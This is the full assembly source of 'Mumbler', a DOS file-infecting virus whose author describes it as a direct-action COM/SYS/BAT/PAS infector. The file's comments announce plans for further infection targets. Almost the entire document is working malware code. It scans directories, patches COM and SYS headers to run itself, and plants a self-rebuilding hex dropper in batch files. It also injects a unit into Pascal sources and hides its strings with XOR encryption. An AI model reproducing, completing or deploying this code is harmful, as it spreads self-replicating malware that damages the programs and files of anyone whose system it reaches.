   ; Mumbler ! Direct action Com/Sys/Bat/Pas infector v.1.0
   ; In v.1.1 i'll add probably Exe/Ne-Exe/Hlp/Winword Doc files infection.
   ; And probably script.ini (MiRC) infection ;)
   ; I didn't added this at current release because had no enough time :(

   ; Not crypted - crypted just text strings

   ; People,could anybody help me with Doc file structure ? ! ?
   ; If you have some info, plz send me to Biodrone2@hotmail.com

   .model tiny
   .386
   .code
       org 0h
   Mumbler:pusha
       push es ds

       push cs cs              ; Store Regs
       pop  ds es


       Call Get+1
   Get:    nop
       pop bp

       Call Crypt              ; Decrypt text strings

       Call RestHost               ; Restore our host

       lea dx,[Dta-Get][Bp]            ; Setup DTA
       mov ah,1Ah
       int 21h

       mov ah,4Eh
       lea dx,[FMask-Get][Bp]          ; Find first file
   NFile:  int 21h
       jb  ExecHost
       Call Check              ; Find extension
       or ax,ax
       jz NextFile
       dec ax
       jz InfCom
       dec ax
       jz InfSys
       dec ax
       jz InfBat
       dec ax
       jz InfPas

   InfPas:
       Call InfectPas              ; Infect Pas
       jmp NextFile
   InfBat:
       Call InfectBat              ; Infect Bat
       jmp NextFile
   InfSys:
       Call InfectSys              ; Infect Sys
       jmp NextFile
   InfCom:
       Call InfectCom              ; Infect Com
   NextFile:
       mov ah,4Fh              ; Next file
       jmp NFIle

   ExecHost:                   ; Return work to host
       pop ds es
       popa
       db  0B0h
   RH  db  0
       cmp al,0
       jz RC
       cmp al,1
       jz RS
       cmp al,2
       jz RB
       cmp al,3
       jz RP
   RP: jmp Outta
   RS: jmp word ptr cs:[8]
   RC: mov ax,150h
       sub ax,050h
       jmp ax
   RB: .exit 0

   Check   proc
       lea di,[FName-Get][Bp]          ; Find extension
       mov cx,13
       mov al,'.'              ; Find dot
   repne   scasb
       jnz Bad
       xor dx,dx
       xchg si,di
       lodsw                   ; Get word
       or ax,2020h             ; TO LOWER CASE ;)
       cmp ax,'oc'             ; Co ?
       jz ItsCom
       cmp ax,'ys'             ; Sy ?
       jz ItsSys
       cmp ax,'ab'             ; Ba ?
       jz ItsBat
       cmp ax,'ap'             ; Pa ?
       jz ItsPas
       jmp Bad
   ItsPas: inc dx
   ItsBat: inc dx
   ItsSys: inc dx
   ItsCom: inc dx
       xchg ax,dx
       ret
   Bad:    xor ax,ax
       ret
   Check   endp

   Old db  0CDh,020h,0,0
   Host    db  0           ; 0 - Com
                       ; 1 - Sys
                       ; 2 - Bat
                       ; 3 - Pas

   InfectCom   proc            ; Com infection procedure
       Call Open
       jb BadCom
       Call CheckFile
       jz CCom
       Call ReadOld
       Call FEnd
       or dx,dx
       jnz CCom
       push ax
       mov byte ptr ds:[Host-Get][Bp],0
       Call WriteUs
       pop  ax
       sub ax,3
       mov ds:[CTmp-Get][Bp],ax
       Call FStart
       mov ah,40h
       lea dx,[CTmp-Get-1][Bp]
       mov cx,4
       int 21h
       Call Mark
   CCom:   Call Close
   BadCom:
       ret
   InfectCom   endp

   InfectSys   proc            ; Sys infection procedure
       Call Open
       jb BadSys
       Call CheckFile
       jz CSys
       mov ax,4200h
       xor cx,cx
       mov dx,8
       int 21h
       Call ReadOld
       Call FEnd
       or dx,dx
       jnz CSys
       push ax
       mov byte ptr ds:[Host-Get][Bp],1
       Call WriteUs
       pop  ax
       mov ds:[CTmp-Get][Bp],ax
       mov ax,4200h
       xor cx,cx
       mov dx,8
       int 21h
       mov ah,40h
       lea dx,[CTmp-Get][Bp]
       mov cx,2
       int 21h
       Call Mark
   CSys:   Call Close
   BadSys:
       ret
   InfectSys   endp

   InfectBat   proc            ; Bat infection procedure
       Call Open
       jb BadBat
       Call CheckFile
       jz CBat
       Call FEnd
       mov byte ptr ds:[Host-Get][Bp],2
       mov al,0            ; Bat Style
       Call WriteTxt
       Call Mark
   CBat:   Call Close
   BadBat:
       ret
   InfectBat   endp

   InfectPas   proc                ; Pas infection procedure
       mov ah,5Bh              ; Our .pas unit exists ?
       xor cx,cx
       lea dx,[PasUnit-Get][Bp]
       int 21h
       jb  DoInfection
       xchg ax,bx
       mov byte ptr ds:[Host-Get][Bp],3    ; No ! Create unit
       mov al,1
       Call WriteTxt
       Call Close
   DoInfection:
       Call Open               ; Open file
       jb BadPas
       mov ax,0B8FAh               ; Use VideoMem for temp
       mov ds,ax
       mov ah,3Fh
       xor dx,dx
       mov cx,4000             ; Read 4000 bytes
       int 21h
       xor si,si
   FindUses:
       lodsb
       dec cx
       or cx,cx
       jz NoUses
       or al,20h
       cmp al,'u'              ; Find 'u'
       jne FindUses
       lodsw
       or ax,2020h
       cmp ax,'es'             ; 'se' ?
       jz Check2
       dec si
       dec si
       jmp FindUses
   Check2: lodsb
       or al,20h
       cmp al,'s'              ; 's' ?
       jz ItUses
       sub si,3
       jmp FindUses
   ItUses: lodsb
       cmp al,20h              ; Skip spaces
       jz ItUses
       dec si
       lodsw                   ; Get first unit
       or ax,2020h             ; to lowercase
       cmp ax,'qf'             ; FQ ?
       jz CPas                 ; Yea
       dec si                  ; Nope
       dec si

       xchg di,bx
       Call CreateTemp             ; Create temp file
       mov ah,40h              ; Write pas file before 'uses'
       cwd
       mov cx,si
       int 21h
       push ds ds cs
       pop  ds
       mov ah,40h
       mov cx,UnitNL               ; Write 'FQ,'
       lea dx,[UnitN-Get][Bp]
       int 21h
       pop  ds es
       xchg di,bx
       mov ax,4200h                ; Back to 'uses'
       xor cx,cx
       mov dx,si
       int 21h
       mov ah,3fh              ; Read 4000 bytes
       cwd
       mov cx,4000
       int 21h
       xchg di,bx
       xchg ax,si
   CopyFile:
       mov ah,40h              ; Write Si bytes
       mov cx,si
       int 21h

       xchg di,bx
       mov ah,3Fh              ; Read 4000 bytes
       cwd
       mov cx,4000
       int 21h
       xchg di,bx

       mov si,ax               ; Si = Num readed

       or ax,ax                ; Nothing readed ?
       jnz CopyFile

       Call CloseTemp              ; Close Temp
   NoUses: push cs cs
       pop  ds es
       mov ah,41h
       lea dx,[FName-Get][Bp]          ; Delete victim
       int 21h
       mov ah,56h
       lea dx,[FTemp-Get][Bp]          ; Rename temp to victim
       lea di,[FName-Get][Bp]
       int 21h
   CPas:   push cs cs
       pop  es ds
       Call Close              ; Close victim
   BadPas: ret
   InfectPas   endp

       db  0E9h
   CTmp    dw  ?
       db  'i'

   CreateTemp  proc                ; Create temporary file
       push ds cs
       pop  ds
       mov ah,3Ch
       xor cx,cx
       lea dx,[FTemp-Get][Bp]
       int 21h
       xchg ax,bx
       pop  ds
       ret
   CreateTemp  endp

   CloseTemp   proc                ; Close temp file
       mov ah,3eh
       int 21h
       ret
   CloseTemp   endp

   CheckFile   proc                ; Check file for infection
       mov ax,5700h
       int 21h
       or cx,not 'DV'
       inc cx
       or cx,cx
       ret
   CheckFile   endp

   Mark    proc                    ; Mark infected file
       xor ax,ax
       Call GetRnd
       mov cx,ax
       or  cx,'DV'
       push cx
       mov ax,5700h
       int 21h
       pop  cx
       mov ax,5701h
       int 21h
       ret
   Mark    endp

   RSeed   dw  'AV'

   GetRnd  proc                ; Get random
       push bx cx dx ax
       mov ax,ds:[RSeed-Get][Bp]
       xchg ah,al
       rol ax,1
       ror ah,1
       sbb ax,1
       add ax,0F01Ch
       mov ds:[RSeed-Get][Bp],ax
       pop cx
       or cx,cx
       jz NoDiv
       xor dx,dx
       div cx
       xchg ax,dx
   NoDiv:  pop dx cx bx
       ret
   GetRnd  endp

   Open    proc                    ; Open finded file
       mov ax,3d02h
       lea dx,[Fname-Get][Bp]
       int 21h
       xchg ax,bx
       ret
   Open    endp

   Close   proc                    ; Close finded file
       mov ah,3eh
       int 21h
       ret
   Close   endp

   ;--------------------------;
   FEnd:   mov ax,4202h                ; To File end
       jmp FSeek
   FStart: mov ax,4200h                ; File start
   FSeek:  xor cx,cx
       cwd
       int 21h
       ret
   ;--------------------------;
   ReadOld:
       mov ah,3fh              ; Read 4 bytes
       jmp GoOld
   WriteOld:
       mov ah,40h              ; Write 4 bytes
   GoOld:  lea dx,[Old-Get][Bp]
       mov cx,4
       int 21h
       ret
   ;--------------------------;
   WriteUs:                    ; Write us
       Call Crypt              ; Crypt text strings
       mov ah,40h
       lea dx,[Mumbler-Get][Bp]
       mov cx,Vlen
       int 21h
       Call Crypt              ; Decrypt text strings
       ret

   FMask   db  '*.*',0

   RestHost    proc                ; Restore host
       mov al,ds:[Host-Get][Bp]
       mov ds:[RH-Get][Bp],al
       cmp al,0
       jz RCom
       cmp al,1
       jz RSys
       cmp al,2
       jz RBat
       cmp al,3
       jz RPas
   RPas:
   RBat:
       ret
   RSys:   lea si,[Old-Get][Bp]
       mov di,8
       movsw
       ret
   RCom:   lea si,[Old-Get][Bp]
       mov di,100h
       movsw
       movsw
       ret
   RestHost    endp

   WriteTxt    proc            ; Convert our body to HEX form
       cmp al,0            ; Bat style
       jz BatStyle
       cmp al,1
       jz PasStyle         ; Pas style
       ret
   BatStyle:
       mov ah,40h
       lea dx,[Ctty-Get][Bp]       ; Write '@Ctty nul'
       mov cx,CttyNul
       int 21h
       mov ah,40h
       lea dx,[BatE1-Get][Bp]
       mov cx,BatE1L
       int 21h
       lea si,[Mumbler-Get][Bp]    ; Write 'Echo '
       mov cx,Vlen
       xor dx,dx
   LBump:  lodsb               ; Convert Byte by byte to text form
       mov ah,0            ; For simplicity not HEX
       shl ax,4
       shr al,4
       add ax,'AA'
       mov ds:[CTmp-Get][Bp],ax
       push dx cx
       mov ah,40h
       lea dx,ds:[CTmp-Get][Bp]
       mov cx,2
       int 21h
       pop  cx dx
       inc dx
       cmp dx,20           ; In string > 20 chars ?
       jb NChar
       xor dx,dx
       push dx cx
       mov ah,40h          ; Write '>>Body.Com'+0Dh,0Ah
       lea dx,[Redir-Get][Bp]
       mov cx,RedirL
       int 21h
       pop  cx dx
   NCHar:  loop LBump
       mov ah,40h
       lea dx,[Redir-Get][Bp]      ; Write redirection
       mov cx,RedirL2
       int 21h
       mov ah,40h
       lea dx,[Body-Get][Bp]       ; Write 'Body.Com'
       mov cx,BodyL
       push cx dx
       int 21h
       mov ah,40h
       lea dx,[Del-Get][Bp]        ; Write 'Del Body.Com'
       mov cx,DelL
       int 21h
       mov ah,40h          ; Write 'Ctty Con'
       pop dx cx
       int 21h
       mov ah,40h
       lea dx,[Ctty-Get][Bp]
       mov cx,CttyL
       int 21h
       mov ah,40h
       lea dx,[Con-Get][Bp]
       mov cx,ConL
       int 21h
       ret
   PasStyle:
       mov ah,40h
       lea dx,[PasTpu-Get][Bp]         ; Pas style
       mov cx,PasTpuL              ; Write Pas Unit header
       int 21h
       mov cx,Flen-1
       mov di,15
       lea si,[Mumbler-Get][Bp]
       Call Crypt              ; Crypt text strings
   LetsConv:
       push cx
       lodsb
       Call ToHex              ; To Hex byte
       mov byte ptr ds:[Four+1-Get][Bp],ah ; Store
       mov byte ptr ds:[Four+2-Get][Bp],al
       mov ah,40h
       lea dx,[Four-Get][Bp]           ; Write it
       mov cx,4
       int 21h
       dec di
       or di,di
       jnz LetsLoop
       mov di,15
       mov ah,40h              ; String ended,write enter
       lea dx,[Ent-Get][Bp]
       mov cx,2
       int 21h
   LetsLoop:
       pop  cx
       loop LetsConv
       lodsb
       Call ToHex              ; Last byte. To Hex it
       mov byte ptr ds:[Four+1-Get][Bp],ah
       mov byte ptr ds:[Four+2-Get][Bp],al
       mov ah,40h
       lea dx,[Four-Get][Bp]           ; Write it
       mov cx,3
       int 21h
       Call Crypt
       mov ah,40h
       lea dx,[TpuEnd-Get][Bp]         ; Write Pas Tpu tail
       mov cx,TpuEndL
       int 21h
       ret
   WriteTxt    endp

   ToHex   proc                    ; To Hex
       mov ah,0
       shl ax,4
       shr al,4
       add ax,'00'
       cmp al,'9'
       jbe AlOk
       add al,'A'-'0'-10
   AlOk:   cmp ah,'9'
       jbe AhOk
       add ah,'A'-'0'-10
   AhOk:   ret
   ToHex   endp

   Four    db  '$'
       db  ?
       db  ?
       db  '/'
   Ent db  13,10

   Crypt   proc                ; Crypt/Decrypt text strings
       push si cx
       lea si,[BatE1-Get][Bp]
       mov cx,TxtLen
   Fd: xor byte ptr cs:[si],00     ; Change this after compilation
       inc si              ; (means in debugger)
       loop Fd
       pop  cx si
       ret
   Crypt   endp

   BatE1   db  '@Echo '        ; Bat loader
   Small:  mov si,offset LLen-offset Small+5234h
       sub si,5134h            ; Written to avoid some symbols
       mov di,5555h            ; (00,07,09,0Ah,0Dh,etc in bat)
       push di
       mov cx,Vlen*2+100+4444h
       sub cx,4444h
   LUnpack:lodsw
       add ax,4444h
       cmp ax,0A0Dh+4444h
       jz SkipByte
       cmp ax,0D0Ah+4444h
       jz SkipByte
       sub ax,4444h
       sub ax,'AA'
       shl al,4
       shr ax,4
       stosb
       nop
   SkipByte:
       loop LUnpack
       retn
   LLen:
       db  '>'
   Body    db  'Body.Com',13,10
   BodyL   equ $ - Body
       db  'Echo '
   BatE1L  equ $ - BatE1
   Redir   db  '>>Body.Com',13,10
   Redirl2 equ $ - Redir
       db  'Echo '
   RedirL  equ $ - Redir
   Del db  13,10,'Del '
   DelL    equ $ - Del

   Ctty    db  13,10,'@Ctty '
   CttyL   equ $ - Ctty
       db  'Nul',13,10
   CttyNul equ $ - Ctty
   Con db  'Con',13,10
   Conl    equ $ - Con

   ;--------------------------------;
   PasTpu  db  'Unit FQ;',13,10
       db  'Interface',13,10
       db  'Implementation',13,10
       db  'Begin',13,10
       db  'Inline('
   PasTpuL equ $ - PasTpu
   TpuEnd  db  ');',13,10
       db  'End.',13,10
   TpuEndL equ $ - TpuEnd

   PasUnit db  'FQ.PAS',0
   UnitN   db  'FQ,'
   UnitNL  equ $ - UnitN

   FTemp   db  'TT.TTT',0

   TxtLen  equ $ - BatE1
   Vlen    equ $ - Mumbler

   Dta db  21 dup (?)
       dw  ?
       dw  ?
       db  ?
   FSize   dd  ?
   FName   db  13 dup (?)

   FLen    equ $ - Mumbler
   Outta:

   End Mumbler
